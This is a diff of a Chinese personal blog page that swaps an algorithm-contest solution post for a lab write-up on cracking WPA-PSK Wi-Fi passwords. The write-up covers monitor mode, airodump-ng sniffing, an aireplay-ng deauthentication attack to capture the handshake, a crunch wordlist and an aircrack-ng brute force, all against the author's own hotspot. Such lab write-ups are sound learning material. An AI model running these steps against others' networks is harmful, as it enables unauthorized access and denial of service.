@@ -5,7 +5,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>master&#39;s blog || 【OJ】求和</title>
+    <title>master&#39;s blog || WIFI密码破解</title>
     <meta name="author" content="Gardevoir">
     <meta name="description" content=" ">
     <meta name="keywords" content=" ">
@@ -138,23 +138,23 @@
 <link rel="stylesheet" href="/css/post-body.css">
 <div class="article">
     <div>
-        <h1>【OJ】求和 </h1>
+        <h1>WIFI密码破解 </h1>
     </div>
     <div class="info">
         <span class="date">
             <span class="icon">
                 <a-icon type="calendar" theme="filled" />
             </span>
-            2023/1/27
+            2023/4/10
         </span>
 
         
         <span class="category">
-            <a href="/categories/算法题">
+            <a href="/categories/无线网络安全">
                 <span class="icon">
                     <a-icon type="book" theme="filled" />
                 </span>
-                算法题
+                无线网络安全
             </a>
         </span>
         
@@ -168,8 +168,22 @@
             
             <span class="tag">
                 
-                <a href="/tags/前缀和" style=color:#ffa2c4>
-                    前缀和
+                <a href="/tags/wifi安全" style=color:#00a596>
+                    wifi安全
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/WPA-PSK" style=color:#ff7d73>
+                    WPA-PSK
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/aircrack-ng" style=color:#03a9f4>
+                    aircrack-ng
                 </a>
             </span>
             
@@ -178,108 +192,28 @@
     </div>
 
     <div class="content" v-pre>
-        <p>题目来源：<a target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P2671">P2671 [NOIP2015 普及组] 求和 - 洛谷 | 计算机科学教育新生态 (luogu.com.cn)</a></p>
-<p>题目中给定三元组（x，y，z），可以发现y根本没有什么作用，只要（x + z）/ 2是一个整数就行了。那么我们所求的三元组就是同奇偶的x和z。</p>
-<p>在计算之前，先进性排序处理，首先将相同color的数放在一起，然后对于相同color的数据，将其按照奇偶进行分开，因此需要自定义cmp函数：</p>
-<pre><code class="lang-c++">bool cmp(const Node &amp;a, const Node &amp;b)
-&#123;
-    if (a.col != b.col)
-        return a.col &lt; b.col;
-    else
-        return a.idx % 2 &lt; b.idx % 2;
-&#125;
-</code></pre>
+        <h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>利用Aircrack-ng套件破解WPA-PSK加密无线网络，了解WPA-PSK破解方法。</p>
+<h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><p>WPA（Wi-Fi Protected Access，Wi-Fi保护访问）的加密方式有两种，TKIP(Temporal KeyIntegrity Protocol，临时密钥完整协议)和AES-CCMP(Advanced Encryption Standard-CounterCBC-MAC Protocol，高级加密标准-计数器模式密码块链信息认证协议)。TKIP使用的算法仍是WEP采用的RC4算法，并在WEP密钥认证机制中添加了“信息包单加密功能”、“信息监测”、“具有序列功能的初始向量”和“密钥生成功能”等算法。但正是RC4加密方式的缺陷引起了大量安全问题。AES-CCMP没有再沿用WEP采用的RC4算法，它重新设计了Wi-Fi的加密方式，使用了AES这种迭代的、对称密钥分组的算法，没有TKIP所存在的大量潜在缺陷。</p>
+<p>WPA认证机制有两种形式：WPA-PSK(WPA Pre-Shared Key，WPA的预共享密钥模式)以及WPA Enterprise(WPA的企业模式)，由于WPA Enterprise使用频率不高以及设备不足，本实验所说的WPA机制仅限于WPA Pre-Shared Key。在WPA-PSK机制中，其加密函数的输入是WPA的预共享密钥，无线网络接入点及客户端都知道该预共享密钥，预共享密钥（PSK）是8到63之间的ASCII字符。</p>
 <span id="more"></span>
-<p>排好序后，就可以用双指针，遍历x和z，将符合条件的数进行计算，但这样做最终只能过8个检测点（O2优化可过9个），因此要想全部AC需要继续优化算法，很显然，计算方式是优化的一个地方。</p>
-<p>考虑以下式子：</p>
-<pre><code>n = 1
-ans = f1 * a1
-
-n = 2
-ans = (f1 + f2) * (a1 + a2)
-
-n = 3
-ans = (f1 + f2) * (a1 + a2) + (f1 + f3) * (a1 + a3) + (f2 + f3) * (a2 + a3)
-    = (f1 + f2 + f3) * (a1 + a2 + a3) + f1 * a1 + f2 * a2 + f3 * f3
-
-n = 4
-ans = (f1 + f2 + f3 + f4) * (a1 + a2 + a3 + a4) + 2 * (f1 * a1 + f2 * a2 + f3 * a3 + f4 * a4)
-</code></pre><p>于是可以得到计算的通式：</p>
-<pre><code>ans(n) = sum_f(n) * sum_a(n) + (n - 2) * sum_fa(n)
-</code></pre><p>因此我们可以转换为前缀和的形式来进行计算，可以大大降低时间复杂度，代码如下：</p>
-<pre><code class="lang-c++">//#pragma GCC optimize(2)
-#include &lt;iostream&gt;
-#include &lt;algorithm&gt;
-using namespace std;
-
-typedef unsigned long long int ll;
-
-
-#define N (10007)
-ll n, m;
-
-struct Node&#123;
-    ll idx;
-    ll num;
-    ll col;
-&#125;;
-
-ll sumf[100005], suma[100005], sumfa[100005];
-
-Node arr[100005];
-
-int read() &#123;
-    int x=0,f=1;
-    char c=getchar();
-    while(c&lt;&#39;0&#39;||c&gt;&#39;9&#39;)&#123;if(c==&#39;-&#39;) f=-1;c=getchar();&#125;
-    while(c&gt;=&#39;0&#39;&amp;&amp;c&lt;=&#39;9&#39;) x=x*10+c-&#39;0&#39;,c=getchar();
-    return x*f;
-&#125;
-
-void write(int x) &#123;
-     if(x&lt;0) putchar(&#39;-&#39;),x=-x;
-     if(x&gt;9) write(x/10);
-     putchar(x%10+&#39;0&#39;);
-&#125;
-
-bool cmp(const Node &amp;a, const Node &amp;b)
-&#123;
-    if (a.col != b.col)
-        return a.col &lt; b.col;
-    else
-        return a.idx % 2 &lt; b.idx % 2;
-&#125;
-
-int main()
-&#123;
-    cin &gt;&gt; n &gt;&gt; m;
-    for (ll i = 1; i &lt;= n; i++)
-        arr[i].num = read();
-    for (ll i = 1; i &lt;= n; i++)
-        arr[i].col = read();
-    for (ll i = 1; i &lt;= n; i++)
-        arr[i].idx = i;
-    sort(arr + 1, arr + n + 1, cmp);
-    sumf[0] = suma[0] = sumfa[0] = 0;
-    sumf[1] = arr[1].num, suma[1] = arr[1].idx, sumfa[1] = arr[1].idx * arr[1].num; 
-    for (int i = 2; i &lt;= n; i++)
-        sumf[i] = sumf[i - 1] + arr[i].num, suma[i] = suma[i - 1] + arr[i].idx, sumfa[i] += sumfa[i - 1] + arr[i].idx * arr[i].num;  
-    ll ans = 0;
-    //for (int i = 1; i &lt;= n; i++)
-      //  cout &lt;&lt; arr[i].idx &lt;&lt; &quot; &quot; &lt;&lt; arr[i].col &lt;&lt; &quot; &quot; &lt;&lt; arr[i].num &lt;&lt; endl;
-    for (ll i = 1; i &lt;= n; )
-    &#123;
-        int j = i + 1;
-        while (j &lt;= n &amp;&amp; arr[j].col == arr[i].col &amp;&amp; !((arr[j].idx + arr[i].idx) % 2)) j++;
-        j--;
-        if (j &gt; i)
-            ans += (sumf[j] - sumf[i - 1]) * (suma[j] - suma[i - 1]) + (j - i - 1) * (sumfa[j] - sumfa[i - 1]) % N;
-        i = j + 1;
-    &#125;
-    cout &lt;&lt; ans % N &lt;&lt; endl;
-    system(&quot;pause&quot;);
-&#125;
+<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>首先开启热点Mate30 5G，用于充当目标AP进行攻击。</p>
+<p>在kali-linux上执行以下命令，开启网卡的监控模式：</p>
+<pre><code class="lang-shell">airmon-ng start wlan0
+ifconfig wlan0mon down
+iwconfig wlan0mon mode monitor
+ifconfig wlan0mon up
+iwconfig wlan0mon
 </code></pre>
+<p>然后输入airodump-ng wlan0mon进行wifi信号的嗅探，找到目标AP ”Mate30 5G“以及连接到它的设备：</p>
+<p><img src="3.png" alt="3"></p>
+<p>下面使用aireplay-ng进行DOS攻击，来获取WPA四次握手包，输入指令为aireplay-ng —deauth 8 -a &lt;热点的MAC&gt; -c &lt;连接的设备的MAC&gt; wlan0mon，但在此之前，需要输入以下命令来进行抓包：</p>
+<pre><code class="lang-shell">airodump-ng -c &lt;AP的频道&gt; -w &lt;抓取握手包的存放位置&gt; --bssid &lt;AP的MAC地址&gt; &lt; monitor名称&gt;
+</code></pre>
+<p>上面两条指令的目的在于抓到WAP的四次握手包，运行效果如下（左边为抓包，右边为DOS攻击）：</p>
+<p><img src="1.png" alt="1"></p>
+<p>最后使用aircrack-ng进行WPA-PSK的破解，用crunch工具生成一份字典：<code>crunch 10 10 qwert%%%%% &gt;&gt; pass.txt</code>，具体的字典生成可根据需要自行修改，比如指定正则表达式的结构等，在这里为了实验的方便，我设定密码的形式为前五位固定，后五位为数字。</p>
+<p>然后输入<code>aircrack-ng -w pass.txt wpa2-01.cap</code>（此处的wpa2文件为抓包的保存文件），就可以对密码进行暴力的破解：</p>
+<p><img src="2.png" alt="2"></p>
 
     </div>
 
